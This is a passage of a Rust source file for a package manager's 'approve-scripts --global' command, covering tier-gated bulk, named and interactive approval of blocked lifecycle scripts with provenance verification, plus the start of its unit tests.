             skipped — run `lpm install -g <pkg>` to repopulate: {}",
            aggregate.unreadable_origins.len(),
            aggregate.unreadable_origins.join(", "),
        ));
    }
    println!();
}

// ─── rerun-hint helpers (origin-aware) ─────────────────────
//
// After `lpm approve-scripts --global` writes a binding, the user must
// reinstall the affected globals to actually re-execute the lifecycle
// scripts that were blocked at install time. `lpm rebuild --global`
// is a planned follow-up; until then, the truthful path is
// `lpm uninstall -g <origin> && lpm install -g <origin>`.
//
// IMPORTANT: the affected origins are the TOP-LEVEL globally-installed
// packages whose tree contains the approved blocked row, NOT the
// approved row's own name. A transitive approval (e.g., `esbuild`
// pulled in by `eslint` and `vite-plugin-foo`) needs the user to
// reinstall both top-level globals; the row's name (`esbuild`) may
// not even be a valid `lpm uninstall -g` target.

/// Compute the sorted-deduped union of `origins` across many aggregate
/// rows. Used to render a single rerun-hint covering the full scope of
/// a bulk approval.
fn union_origins<'a>(
    rows: impl IntoIterator<Item = &'a crate::global_blocked_set::AggregateBlockedRow>,
) -> Vec<String> {
    let mut set: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
    for r in rows {
        for o in &r.origins {
            set.insert(o.clone());
        }
    }
    set.into_iter().collect()
}

/// Render the post-approval rerun hint to stderr. Empty `origins`
/// triggers an actionable fallback that points the user at `--list`
/// rather than dropping silent guidance.
fn emit_rerun_hint_stderr(origins: &[String]) {
    if origins.is_empty() {
        output::info(
            "Unable to derive the affected global list. Run \
             `lpm approve-scripts --global --list` to see which globals \
             were affected, then reinstall those to execute approved scripts.",
        );
        return;
    }
    if origins.len() == 1 {
        output::info(&format!(
            "Next step — reinstall to execute approved scripts: \
             `lpm uninstall -g {0} && lpm install -g {0}`. \
             (`lpm rebuild --global` is a planned follow-up.)",
            origins[0],
        ));
        return;
    }
    output::info("Next step — reinstall the affected globals to execute approved scripts:");
    for o in origins {
        eprintln!("    lpm uninstall -g {o} && lpm install -g {o}");
    }
    eprintln!("(`lpm rebuild --global` is a planned follow-up.)");
}

/// Build the structured `next_step` JSON payload that mirrors
/// [`emit_rerun_hint_stderr`]. Agents can act on the structured form
/// without parsing the prose.
fn rerun_next_step_json(origins: &[String]) -> serde_json::Value {
    serde_json::json!({
        "kind": "reinstall_globals",
        "origins": origins,
    })
}

/// `--yes` implementation: approve every row in the aggregate in one
/// transactional write under the global tx lock. Loud — emits a warning
/// banner in non-JSON mode; in JSON mode surfaces the warning via the
/// structured `warnings` field so agents can detect bulk-approval flows.
///
/// **Lock order:** `store_lock` (outer shared, held by the parent
/// [`run_global_under_store_lock`]) → `global_tx_lock` (inner exclusive,
/// taken here). Do not invert.
async fn run_global_bulk_yes(
    root: &lpm_common::LpmRoot,
    aggregate: &crate::global_blocked_set::AggregateBlockedSet,
    dry_run: bool,
    json_output: bool,
    verify_policy: &crate::provenance_fetch::VerifyPolicy,
    runtime_enforce: crate::provenance_fetch::EnforceMode,
) -> Result<(), LpmError> {
    // Refuse global `--yes` for any aggregate row classified outside
    // the green tier — parity with the project `--yes` gate. The gate
    // runs BEFORE the provenance fetch + banner emission so a refused
    // run doesn't burn network round-trips or emit a success-shaped
    // human/tracing line that would later need contradiction. Matches
    // the project call-site ordering at line 575.
    //
    // M75: pre-fix `run_global_bulk_yes` wrote aggregate rows straight
    // to `~/.lpm/global/trusted-dependencies.json` without any tier
    // check. The hole was that an `amber` / `amber-llm` / `red` lifecycle
    // script in a global tree could be approved through the bulk path
    // while the project `--yes` would refuse the same classification.
    enforce_tiered_yes_gate(&aggregate.rows, GateScope::Global)?;

    // Network fetch (provenance) happens BEFORE the lock so the
    // critical section stays bounded. Transport failures degrade to
    // `ProvenanceStatus::TransportDegraded`; a verifier rejection
    // surfaces as `VerificationRejected` (SILENT-DROP fix)
    // and refuses the approval below.
    let pairs: Vec<(String, String)> = aggregate
        .rows
        .iter()
        .map(|r| (r.name.clone(), r.version.clone()))
        .collect();
    let provenance =
        crate::provenance_fetch::fetch_provenance_for_pkgs(&pairs, verify_policy).await;

    // Resolve each row's binding snapshot BEFORE entering the tx lock
    // so a verifier rejection (which returns
    // `Err(LpmError::ProvenanceVerification)`) fails out before we
    // start mutating the trust store — preserving any prior binding
    // untouched. Doing this inside the lock would still preserve the
    // binding (the lock body returns Err without writing), but
    // resolving outside keeps the lock window smaller and the failure
    // path simpler to reason about.
    let mut row_snapshots: Vec<(usize, Option<ProvenanceSnapshot>)> =
        Vec::with_capacity(aggregate.rows.len());
    for (idx, row) in aggregate.rows.iter().enumerate() {
        let snap = snapshot_for_binding(&provenance, &row.name, &row.version, runtime_enforce)?;
        row_snapshots.push((idx, snap));
    }

    // Inside the tx lock — bounded read-modify-write.
    let lock_path = root.global_tx_lock();
    let root_for_body = root;
    let aggregate_for_body = aggregate;
    let row_snapshots_for_body = row_snapshots;
    lpm_common::with_exclusive_lock_async(lock_path, async move {
        let mut trust = lpm_global::trusted_deps::read_for(root_for_body)?;
        for (idx, snap) in row_snapshots_for_body {
            let row = &aggregate_for_body.rows[idx];
            trust.insert_binding(
                &row.name,
                &row.version,
                lpm_global::TrustedDependencyBinding {
                    integrity: row.integrity.clone(),
                    script_hash: row.script_hash.clone(),
                    provenance_at_approval: snap,
                },
            );
        }
        if !dry_run {
            crate::security_approval::ensure_global_trust_candidate_authorized_from_trust(
                root_for_body,
                &trust,
                json_output,
                crate::security_approval::ApprovalSource::CliFlag,
            )?;
            lpm_global::trusted_deps::write_for(root_for_body, &trust)?;
        }
        Ok(())
    })
    .await?;

    let origins = union_origins(&aggregate.rows);

    if json_output {
        let warning = if dry_run {
            format!(
                "DRY RUN — would bulk-approve {} globally-blocked package(s); no write performed",
                aggregate.rows.len()
            )
        } else {
            format!(
                "bulk-approved {} globally-blocked package(s) via --yes",
                aggregate.rows.len()
            )
        };
        // Per-package `provenance` block for every bulk-approved
        // row so the JSON envelope's audit trail matches the
        // project-side `--yes` path.
        let approved_entries: Vec<serde_json::Value> = aggregate
            .rows
            .iter()
            .map(|r| {
                let mut entry = serde_json::json!({
                    "name": r.name,
                    "version": r.version,
                    "integrity": r.integrity,
                    "script_hash": r.script_hash,
                });
                if let Some(status) = provenance.get(&(r.name.clone(), r.version.clone())) {
                    let (verified, rejection_reason) = status.to_json_verified();
                    let mut prov = serde_json::Map::new();
                    prov.insert("verified".into(), verified);
                    if let Some(reason) = rejection_reason {
                        prov.insert("rejection_reason".into(), serde_json::Value::String(reason));
                    }
                    entry
                        .as_object_mut()
                        .unwrap()
                        .insert("provenance".into(), serde_json::Value::Object(prov));
                }
                entry
            })
            .collect();
        let mut body = serde_json::json!({
            "schema_version": SCHEMA_VERSION,
            "command": "approve-scripts",
            "scope": "global",
            "dry_run": dry_run,
            "blocked_count": aggregate.rows.len(),
            "approved_count": aggregate.rows.len(),
            "skipped_count": 0,
            "approved": approved_entries,
            "warnings": [warning],
            "errors": [],
        });
        // `next_step` directs agents to run a follow-up command. Under
        // `--dry-run` no mutation happened, so emitting a follow-up
        // would mislead automation into reinstalling globals whose
        // approval was never persisted. Only emit on real writes.
        if !dry_run {
            body.as_object_mut()
                .unwrap()
                .insert("next_step".into(), rerun_next_step_json(&origins));
        }
        println!("{}", serde_json::to_string_pretty(&body).unwrap());
    } else if dry_run {
        output::warn(&format!(
            "DRY RUN — would bulk-approve {} globally-blocked package{}. No changes written.",
            aggregate.rows.len(),
            if aggregate.rows.len() == 1 { "" } else { "s" },
        ));
    } else {
        output::warn(&format!(
            "Bulk-approved {} globally-blocked package{}.",
            aggregate.rows.len(),
            if aggregate.rows.len() == 1 { "" } else { "s" },
        ));
        output::info(
            "Trust is bound to the current (name, version, integrity, script_hash) tuple — \
             any subsequent drift re-opens review.",
        );
        emit_rerun_hint_stderr(&origins);
    }
    Ok(())
}

/// Named-package approval: `lpm approve-scripts --global esbuild` or
/// `--global esbuild@0.25.1`. Finds the matching row by name or
/// `name@version` substring, writes one trust binding under the global
/// tx lock.
///
/// **Lock order:** `store_lock` (outer shared, held by the parent
/// [`run_global_under_store_lock`]) → `global_tx_lock` (inner exclusive,
/// taken here). Do not invert.
async fn run_global_named(
    root: &lpm_common::LpmRoot,
    aggregate: &crate::global_blocked_set::AggregateBlockedSet,
    arg: &str,
    dry_run: bool,
    json_output: bool,
    verify_policy: &crate::provenance_fetch::VerifyPolicy,
    runtime_enforce: crate::provenance_fetch::EnforceMode,
) -> Result<(), LpmError> {
    // Audit: (GPT finding 1): bare-name lookup must refuse silently-
    // picking-first when multiple rows match. Aggregate rows are deduped
    // by `(name, version, integrity, script_hash)` per the dedup rule,
    // so a single bare name can legitimately resolve to multiple rows
    // (same package at different versions, OR same name@version with
    // different tarball bindings across install roots). Silently
    // approving the first match is a latent data-corruption bug —
    // require `name@version` disambiguation.
    let row = match lookup_aggregate_by_arg(&aggregate.rows, arg) {
        AggregateLookup::Match(row) => row,
        AggregateLookup::NotFound => {
            return Err(LpmError::NotFound(format!(
                "package '{arg}' is not in the global blocked set. Run \
                 `lpm approve-scripts --global --list` to see what's blocked."
            )));
        }
        AggregateLookup::Ambiguous { candidates } => {
            // List the concrete name@version strings the user could
            // disambiguate with. Sorted + deduped so the hint is
            // deterministic regardless of row order.
            let mut keys: Vec<String> = candidates
                .iter()
                .map(|r| format!("{}@{}", r.name, r.version))
                .collect();
            keys.sort();
            keys.dedup();
            return Err(LpmError::Script(format!(
                "package '{arg}' is ambiguous in the global blocked set — {} rows match. \
                 Re-run with `name@version` to disambiguate. Candidates: {}",
                candidates.len(),
                keys.join(", "),
            )));
        }
    };

    // fetch provenance OUTSIDE the tx lock so a slow
    // network response doesn't block parallel `--global` invocations.
    // SILENT-DROP fix: `?` propagates a verifier rejection
    // BEFORE acquiring the lock, leaving any prior binding intact.
    let pairs = vec![(row.name.clone(), row.version.clone())];
    let provenance =
        crate::provenance_fetch::fetch_provenance_for_pkgs(&pairs, verify_policy).await;
    let snap = snapshot_for_binding(&provenance, &row.name, &row.version, runtime_enforce)?;

    let lock_path = root.global_tx_lock();
    let root_for_body = root;
    let row_for_body = row;
    let snap_for_body = snap;
    lpm_common::with_exclusive_lock_async(lock_path, async move {
        let mut trust = lpm_global::trusted_deps::read_for(root_for_body)?;
        trust.insert_binding(
            &row_for_body.name,
            &row_for_body.version,
            lpm_global::TrustedDependencyBinding {
                integrity: row_for_body.integrity.clone(),
                script_hash: row_for_body.script_hash.clone(),
                provenance_at_approval: snap_for_body,
            },
        );
        if !dry_run {
            crate::security_approval::ensure_global_trust_candidate_authorized_from_trust(
                root_for_body,
                &trust,
                json_output,
                crate::security_approval::ApprovalSource::CliFlag,
            )?;
            lpm_global::trusted_deps::write_for(root_for_body, &trust)?;
        }
        Ok(())
    })
    .await?;

    // Origin enumeration uses the matched row's `origins`. Sorted +
    // deduped via `union_origins([row])` so the rendering is stable.
    let origins = union_origins(std::iter::once(row));

    if json_output {
        // Surface the per-package `provenance.verified` alongside
        // the existing identity fields. Derived from the same
        // `ProvenanceStatus` map the binding-write path consulted,
        // so the JSON envelope and the trust binding stay mutually
        // consistent.
        let mut approved_entry = serde_json::json!({
            "name": row.name,
            "version": row.version,
            "integrity": row.integrity,
            "script_hash": row.script_hash,
        });
        if let Some(status) = provenance.get(&(row.name.clone(), row.version.clone())) {
            let (verified, rejection_reason) = status.to_json_verified();
            let mut prov = serde_json::Map::new();
            prov.insert("verified".into(), verified);
            if let Some(reason) = rejection_reason {
                prov.insert("rejection_reason".into(), serde_json::Value::String(reason));
            }
            approved_entry
                .as_object_mut()
                .unwrap()
                .insert("provenance".into(), serde_json::Value::Object(prov));
        }
        let mut body = serde_json::json!({
            "schema_version": SCHEMA_VERSION,
            "command": "approve-scripts",
            "scope": "global",
            "dry_run": dry_run,
            "approved_count": 1,
            "skipped_count": 0,
            "blocked_count": aggregate.rows.len(),
            "approved": [approved_entry],
            "warnings": [],
            "errors": [],
        });
        // Same dry-run contract as `run_global_bulk_yes`: omit
        // `next_step` when no mutation was performed.
        if !dry_run {
            body.as_object_mut()
                .unwrap()
                .insert("next_step".into(), rerun_next_step_json(&origins));
        }
        println!("{}", serde_json::to_string_pretty(&body).unwrap());
    } else if dry_run {
        output::info(&format!(
            "DRY RUN — would approve {} @ {} globally. No changes written.",
            row.name.bold(),
            row.version.dimmed()
        ));
    } else {
        output::success(&format!(
            "Approved {} @ {} globally.",
            row.name.bold(),
            row.version.dimmed()
        ));
        emit_rerun_hint_stderr(&origins);
    }
    Ok(())
}

/// Result of resolving a user-supplied `<pkg>` argument to an aggregate
/// row. Three outcomes:
///
/// - `Match` — exactly one row matches. Approve it.
/// - `NotFound` — zero rows match the given arg. Caller surfaces
///   NotFound with a hint toward `--list`.
/// - `Ambiguous` — a BARE NAME matched multiple rows (different
///   versions, or same name@version with drifted bindings across
///   install roots). Caller surfaces a Script error listing the
///   candidates so the user can re-run with `name@version`.
///
/// `name@version` form cannot be ambiguous by construction — dedup in
/// the aggregator is keyed by `(name, version, integrity, script_hash)`,
/// so two rows with the same `name@version` imply different bindings
/// and that IS the disambiguation signal we want to preserve.
#[derive(Debug)]
enum AggregateLookup<'a> {
    Match(&'a crate::global_blocked_set::AggregateBlockedRow),
    NotFound,
    Ambiguous {
        candidates: Vec<&'a crate::global_blocked_set::AggregateBlockedRow>,
    },
}

/// Resolve an arg to an `AggregateLookup`. Replaces the pre-audit
/// `find_aggregate_by_arg` which silently took the first match on
/// bare-name lookups — see Audit finding 1.
fn lookup_aggregate_by_arg<'a>(
    rows: &'a [crate::global_blocked_set::AggregateBlockedRow],
    arg: &str,
) -> AggregateLookup<'a> {
    if let Some((name, version)) = arg.rsplit_once('@')
        && !name.is_empty()
    {
        // name@version form: collect ALL matches (different bindings
        // across installs), not just the first. One match → Match;
        // multiple → Ambiguous; zero → NotFound.
        let matches: Vec<&crate::global_blocked_set::AggregateBlockedRow> = rows
            .iter()
            .filter(|r| r.name == name && r.version == version)
            .collect();
        match matches.as_slice() {
            [] => AggregateLookup::NotFound,
            [single] => AggregateLookup::Match(single),
            _ => AggregateLookup::Ambiguous {
                candidates: matches,
            },
        }
    } else {
        // Bare name: collect ALL matches. Multiple = ambiguous.
        let matches: Vec<&crate::global_blocked_set::AggregateBlockedRow> =
            rows.iter().filter(|r| r.name == arg).collect();
        match matches.as_slice() {
            [] => AggregateLookup::NotFound,
            [single] => AggregateLookup::Match(single),
            _ => AggregateLookup::Ambiguous {
                candidates: matches,
            },
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash)]
struct AggregateRowKey {
    name: String,
    version: String,
    integrity: Option<String>,
    script_hash: Option<String>,
}

impl AggregateRowKey {
    fn from_row(row: &crate::global_blocked_set::AggregateBlockedRow) -> Self {
        Self {
            name: row.name.clone(),
            version: row.version.clone(),
            integrity: row.integrity.clone(),
            script_hash: row.script_hash.clone(),
        }
    }
}

fn group_remaining_rows_by_origin<'a>(
    aggregate: &'a crate::global_blocked_set::AggregateBlockedSet,
    decided: &std::collections::HashSet<AggregateRowKey>,
) -> std::collections::BTreeMap<String, Vec<&'a crate::global_blocked_set::AggregateBlockedRow>> {
    let mut grouped: std::collections::BTreeMap<
        String,
        Vec<&'a crate::global_blocked_set::AggregateBlockedRow>,
    > = std::collections::BTreeMap::new();

    for row in &aggregate.rows {
        if decided.contains(&AggregateRowKey::from_row(row)) {
            continue;
        }
        for origin in &row.origins {
            grouped.entry(origin.clone()).or_default().push(row);
        }
    }

    grouped
}

fn print_origin_group_card(origin: &str, rows: &[&crate::global_blocked_set::AggregateBlockedRow]) {
    println!();
    println!(
        "  {} ({} blocked dep{}):",
        origin.bold(),
        rows.len(),
        if rows.len() == 1 { "" } else { "s" },
    );
    for row in rows.iter().take(8) {
        println!(
            "    {} @ {}{}",
            row.name,
            row.version.dimmed(),
            if row.binding_drift {
                "  [binding drift]".yellow().to_string()
            } else {
                String::new()
            }
        );
    }
    if rows.len() > 8 {
        println!("    {}", format!("+{} more", rows.len() - 8).dimmed());
    }
    println!();
}

/// Commit a single approval to `~/.lpm/global/trusted-dependencies.json`
/// under the global tx lock. Reads the on-disk file, inserts the
/// row's binding (with provenance fetched outside this critical
/// section), and writes back atomically. Skipped under `--dry-run`.
///
/// **Lock order:** caller (interactive walk) holds `store_lock`
/// (outer shared); this function takes `global_tx_lock` (inner
/// exclusive). Do not invert.
///
/// Re-reading inside the lock — rather than relying on a long-lived
/// in-memory copy seeded before the prompt loop — is what makes the
/// interactive walk race-safe against parallel `approve-scripts
/// --global` invocations.
async fn commit_global_approval(
    root: &lpm_common::LpmRoot,
    row: &crate::global_blocked_set::AggregateBlockedRow,
    snap: Option<lpm_common::ProvenanceSnapshot>,
    dry_run: bool,
) -> Result<(), LpmError> {
    let lock_path = root.global_tx_lock();
    lpm_common::with_exclusive_lock_async(lock_path, async move {
        let mut trust = lpm_global::trusted_deps::read_for(root)?;
        trust.insert_binding(
            &row.name,
            &row.version,
            lpm_global::TrustedDependencyBinding {
                integrity: row.integrity.clone(),
                script_hash: row.script_hash.clone(),
                provenance_at_approval: snap,
            },
        );
        if !dry_run {
            crate::security_approval::ensure_global_trust_candidate_authorized_from_trust(
                root,
                &trust,
                false,
                crate::security_approval::ApprovalSource::CliFlag,
            )?;
            lpm_global::trusted_deps::write_for(root, &trust)?;
        }
        Ok(())
    })
    .await
}

/// Interactive walk. Flat mode prompts one aggregate row at a time.
/// Grouped mode prompts by top-level global first, but still records
/// approvals as individual dependency binding rows.
///
/// provenance is pre-fetched for the full aggregate before
/// the prompt loop so per-decision writes don't pay HTTP latency
/// while the lock is held. The per-decision writes go through
/// [`commit_global_approval`], which takes `global_tx_lock` so each
/// per-row commit is serialized against parallel `--global` flows.
async fn run_global_interactive(
    root: &lpm_common::LpmRoot,
    aggregate: &crate::global_blocked_set::AggregateBlockedSet,
    group: bool,
    dry_run: bool,
    _json_output: bool,
    verify_policy: &crate::provenance_fetch::VerifyPolicy,
    runtime_enforce: crate::provenance_fetch::EnforceMode,
) -> Result<(), LpmError> {
    use crate::prompt::prompt_err;

    // pre-fetch provenance for every aggregate row in one
    // parallel batch BEFORE the prompt loop. Cheap (~5–10 packages
    // typical) and the on-disk attestation cache absorbs repeats. Keeps
    // the per-decision tx-lock window bounded to a read-modify-write.
    let pairs: Vec<(String, String)> = aggregate
        .rows
        .iter()
        .map(|r| (r.name.clone(), r.version.clone()))
        .collect();
    let provenance =
        crate::provenance_fetch::fetch_provenance_for_pkgs(&pairs, verify_policy).await;

    let mut approved: Vec<&crate::global_blocked_set::AggregateBlockedRow> = Vec::new();
    let mut skipped: Vec<&crate::global_blocked_set::AggregateBlockedRow> = Vec::new();

    println!();
    output::info(&format!(
        "Reviewing {} globally-blocked package{}. Ctrl+C to stop.",
        aggregate.rows.len().to_string().bold(),
        if aggregate.rows.len() == 1 { "" } else { "s" },
    ));
    println!();

    if group {
        let mut decided: std::collections::HashSet<AggregateRowKey> =
            std::collections::HashSet::new();
        let mut quit_early = false;

        loop {
            let grouped = group_remaining_rows_by_origin(aggregate, &decided);
            let Some((origin, rows)) = grouped.into_iter().next() else {
                break;
            };

            print_origin_group_card(&origin, &rows);
            let choice: &str = cliclack::select(format!(
                "How would you like to review blocked deps for {}?",
                origin
            ))
            .item("approve_all", "Approve all for this global", "")
            .item("review", "Review individually", "")
            .item("skip_all", "Skip all for now", "")
            .item("quit", "Quit — stop here; approved rows kept", "")
            .initial_value("review")
            .interact()
            .map_err(prompt_err)?;

            match choice {
                "approve_all" => {
                    // Tier-gate parity with `--yes`. If any row in
                    // THIS group carries a non-green tier, refuse the
                    // bulk-approve action: surface the same refusal
                    // error project --yes prints, then loop back to the
                    // same group's menu so the user explicitly re-
                    // chooses Review / Skip / Quit. Leaving the group's
                    // rows out of `decided` is what re-enters this
                    // group on the next loop iteration — flat-mode has
                    // no equivalent because flat-mode is already
                    // per-package review.
                    //
                    // M75: pre-fix `approve_all` wrote every row in the
                    // group via `commit_global_approval` without any
                    // tier check, opening the same policy hole as
                    // `run_global_bulk_yes` did for the non-interactive
                    // path.
                    if let Err(gate_err) = enforce_tiered_yes_gate(&rows, GateScope::Global) {
                        output::warn(&gate_err.to_string());
                        // Fall through to the loop tail; same group is
                        // re-displayed with the menu so the user can
                        // pick Review individually instead.
                        continue;
                    }
                    for row in &rows {
                        // SILENT-DROP fix: a verifier
                        // rejection on any row in this group aborts
                        // the entire `approve_all` action with a clear
                        // error, leaving any prior bindings for the
                        // remaining rows untouched.
                        let snap = snapshot_for_binding(
                            &provenance,
                            &row.name,
                            &row.version,
                            runtime_enforce,
                        )?;
                        commit_global_approval(root, row, snap, dry_run).await?;
                        approved.push(*row);
                        decided.insert(AggregateRowKey::from_row(row));
                    }
                }
                "skip_all" => {
                    for row in &rows {
                        skipped.push(*row);
                        decided.insert(AggregateRowKey::from_row(row));
                    }
                }
                "review" => {
                    for row in rows {
                        let key = AggregateRowKey::from_row(row);
                        if decided.contains(&key) {
                            continue;
                        }

                        print_aggregate_card(row);
                        let row_choice: &str =
                            cliclack::select(format!("{} @ {} — approve?", row.name, row.version))
                                .item("approve", "Approve", "")
                                .item("skip", "Skip", "")
                                .item("quit", "Quit — stop here; approved rows kept", "")
                                .initial_value("approve")
                                .interact()
                                .map_err(prompt_err)?;

                        match row_choice {
                            "approve" => {
                                // SILENT-DROP fix.
                                let snap = snapshot_for_binding(
                                    &provenance,
                                    &row.name,
                                    &row.version,
                                    runtime_enforce,
                                )?;
                                commit_global_approval(root, row, snap, dry_run).await?;
                                approved.push(row);
                                decided.insert(key);
                            }
                            "skip" => {
                                skipped.push(row);
                                decided.insert(key);
                            }
                            "quit" => {
                                quit_early = true;
                                break;
                            }
                            _ => unreachable!(),
                        }
                    }
                }
                "quit" => {
                    quit_early = true;
                }
                _ => unreachable!(),
            }

            if quit_early {
                break;
            }
        }

        println!();
        if dry_run {
            output::info(&format!(
                "DRY RUN — would approve {}, skip {}, leave {} remaining. No changes written.",
                approved.len(),
                skipped.len(),
                aggregate.rows.len() - approved.len() - skipped.len(),
            ));
        } else if !approved.is_empty() {
            output::success(&format!(
                "{} approved, {} skipped, {} remaining.",
                approved.len(),
                skipped.len(),
                aggregate.rows.len() - approved.len() - skipped.len(),
            ));
            // Always emit the rerun hint when at least one row was
            // approved — `emit_rerun_hint_stderr` owns the empty-origins
            // fallback (actionable "run --list to see which globals were
            // affected" prose), so guarding here would silently drop
            // that fallback when an aggregate row arrives without
            // origins (defensive: shouldn't happen, but the hint is
            // load-bearing if it does).
            let origins = union_origins(approved.iter().copied());
            emit_rerun_hint_stderr(&origins);
        } else {
            output::success(&format!(
                "{} approved, {} skipped, {} remaining.",
                approved.len(),
                skipped.len(),
                aggregate.rows.len() - approved.len() - skipped.len(),
            ));
        }
        return Ok(());
    }

    // Flat interactive path: per-row review with explicit prompts.
    // No tier gate required here because each row is its own decision
    // point — there is no bulk action (parity with the grouped
    // `approve_all` shortcut which IS gated, and the project-level
    // interactive walk which is also per-row).
    for row in &aggregate.rows {
        print_aggregate_card(row);
        let choice: &str = cliclack::select(format!("{} @ {} — approve?", row.name, row.version))
            .item("approve", "Approve", "")
            .item("skip", "Skip", "")
            .item("quit", "Quit — stop here; approved rows kept", "")
            .initial_value("approve")
            .interact()
            .map_err(prompt_err)?;

        match choice {
            "approve" => {
                // SILENT-DROP fix.
                let snap =
                    snapshot_for_binding(&provenance, &row.name, &row.version, runtime_enforce)?;
                // per-row write goes through `commit_global_approval`,
                // which acquires the global tx lock and re-reads trust
                // from disk so the commit is race-safe against parallel
                // `approve-scripts --global` invocations. Ctrl+C mid-walk
                // still preserves earlier rows because each was committed
                // atomically.
                commit_global_approval(root, row, snap, dry_run).await?;
                approved.push(row);
            }
            "skip" => skipped.push(row),
            "quit" => break,
            _ => unreachable!(),
        }
    }
    println!();
    if dry_run {
        output::info(&format!(
            "DRY RUN — would approve {}, skip {}, leave {} remaining. No changes written.",
            approved.len(),
            skipped.len(),
            aggregate.rows.len() - approved.len() - skipped.len(),
        ));
    } else if !approved.is_empty() {
        output::success(&format!(
            "{} approved, {} skipped, {} remaining.",
            approved.len(),
            skipped.len(),
            aggregate.rows.len() - approved.len() - skipped.len(),
        ));
        // See `commit_global_approval`'s grouped-mode counterpart:
        // `emit_rerun_hint_stderr` owns the empty-origins fallback,
        // so guarding here would silently drop that prose when a row
        // legitimately has no origin metadata.
        let origins = union_origins(approved.iter().copied());
        emit_rerun_hint_stderr(&origins);
    } else {
        output::success(&format!(
            "{} approved, {} skipped, {} remaining.",
            approved.len(),
            skipped.len(),
            aggregate.rows.len() - approved.len() - skipped.len(),
        ));
    }
    Ok(())
}

fn print_aggregate_card(row: &crate::global_blocked_set::AggregateBlockedRow) {
    println!(
        "  {} @ {}{}",
        row.name.bold(),
        row.version.dimmed(),
        if row.binding_drift {
            "  [binding drift]".yellow()
        } else {
            String::new()
        }
    );
    println!("    phases: {}", row.phases_present.join(", ").dimmed());
    println!("    origins: {}", row.origins.join(", ").dimmed());
    if let Some(integ) = &row.integrity {
        println!("    integrity: {}", integ.dimmed());
    }
    if let Some(sh) = &row.script_hash {
        println!("    script_hash: {}", sh.dimmed());
    }
    println!();
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::build_state::{BUILD_STATE_VERSION, BlockedPackage, BuildState};
    use crate::provenance_fetch::{EnforceMode, SkipPolicy, VerifyPolicy};
    use lpm_workspace::TrustedDependencyBinding;
    use std::fs;
    use std::path::PathBuf;
    use std::sync::OnceLock;
    use tempfile::tempdir;

    // ── snapshot_for_binding_with_mode (rollout knob) ───

    fn ensure_security_test_backend() {
        static SECURITY_DIR: OnceLock<PathBuf> = OnceLock::new();
        let dir = SECURITY_DIR.get_or_init(|| {
            let dir = tempfile::tempdir().expect("security backend tempdir");
            let path = dir.path().to_path_buf();
            std::mem::forget(dir);
            unsafe {
                std::env::set_var("LPM_SECURITY_DIR", &path);
                std::env::set_var(
                    "LPM_TEST_SECURITY_SECRET_HEX",
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                );
                std::env::set_var("LPM_TEST_SECURITY_AUTH_RESULT", "approve");
            }
            path
        });
        let _ = dir;
    }

    fn verified_status() -> ProvenanceStatus {
        ProvenanceStatus::Verified(ProvenanceSnapshot {
            present: true,
            publisher: Some("github:axios/axios".into()),
            workflow_path: Some(".github/workflows/publish.yml".into()),
            workflow_ref: Some("refs/tags/v1.14.0".into()),
            attestation_cert_sha256: Some("sha256-leaf-aaa".into()),
        })
    }

    fn map_with(
        name: &str,
        version: &str,
        status: ProvenanceStatus,
    ) -> HashMap<(String, String), ProvenanceStatus> {
        let mut m = HashMap::new();
        m.insert((name.to_string(), version.to_string()), status);
        m
    }

    /// Verified bundles project identically under both modes — the
    /// mode only gates the rejection arm.
    #[test]
    fn snapshot_for_binding_verified_projects_under_both_modes() {
        let map = map_with("axios", "1.14.0", verified_status());
        let deny = snapshot_for_binding_with_mode(&map, "axios", "1.14.0", EnforceMode::Deny)
            .expect("Verified must succeed under Deny");
        let warn = snapshot_for_binding_with_mode(&map, "axios", "1.14.0", EnforceMode::Warn)
            .expect("Verified must succeed under Warn");
        assert_eq!(deny, warn);
        assert!(deny.is_some());
    }

    /// Under `Deny` (default production posture), a
    /// `VerificationRejected` status returns
    /// `Err(LpmError::ProvenanceVerification(_))` so the caller's
    /// `?` short-circuits the approval. The prior trust binding (if
    /// any) is preserved by the caller's read-modify-write NOT
    /// executing.
    #[test]
    fn snapshot_for_binding_deny_refuses_on_verification_rejected() {
        let map = map_with(
            "axios",
            "1.14.1",
            ProvenanceStatus::VerificationRejected {
                reason: "DSSE signature mismatch".into(),
            },
        );
        let err = snapshot_for_binding_with_mode(&map, "axios", "1.14.1", EnforceMode::Deny)
            .expect_err("Deny mode must refuse on VerificationRejected");
        assert!(matches!(err, LpmError::ProvenanceVerification(_)));
        let msg = err.to_string();
        assert!(
            msg.contains("axios") && msg.contains("1.14.1"),
            "error must name the package + version, got: {msg}",
        );
        assert!(
            msg.contains("DSSE signature mismatch"),
            "underlying verifier reason must propagate, got: {msg}",
        );
    }

    /// Under `Warn` (rollout-window posture), a
    /// `VerificationRejected` status returns `Ok(None)` so the
    /// approval can proceed without a fresh verifier observation.
    /// This is only one half of the warn-mode contract: the write
    /// path then runs `approval_metadata_preserving_existing_provenance`
    /// which substitutes the prior `provenance_at_approval` if one
    /// exists, so a re-approval under Warn does NOT clear a
    /// previously-verified snapshot. The preservation behavior is
    /// pinned by
    /// `approval_metadata_preserving_existing_provenance_preserves_prior_snapshot_on_none`
    /// below; this test pins only the snapshot-projection seam.
    #[test]
    fn snapshot_for_binding_warn_returns_none_on_verification_rejected() {
        let map = map_with(
            "axios",
            "1.14.1",
            ProvenanceStatus::VerificationRejected {
                reason: "Rekor SET verification failed".into(),
            },
        );
        let result = snapshot_for_binding_with_mode(&map, "axios", "1.14.1", EnforceMode::Warn)
            .expect("Warn mode must allow the approval through");
        assert!(
            result.is_none(),
            "Warn mode records None (no verified identity) — the loud warn log is the operator contract",
        );
    }

    /// `Absent` and `TransportDegraded` are unchanged by the mode —
    /// they're not attack signals, so the rollout knob doesn't gate
    /// them.
    #[test]
    fn snapshot_for_binding_non_rejection_statuses_ignore_mode() {
        let absent_map = map_with("pkg", "1.0.0", ProvenanceStatus::Absent);
        let transport_map = map_with("pkg", "1.0.0", ProvenanceStatus::TransportDegraded);
        for mode in [EnforceMode::Deny, EnforceMode::Warn] {
            let absent = snapshot_for_binding_with_mode(&absent_map, "pkg", "1.0.0", mode)
                .expect("Absent must project under both modes");
            let snap = absent.expect("Absent projects to Some(present:false)");
            assert!(!snap.present);

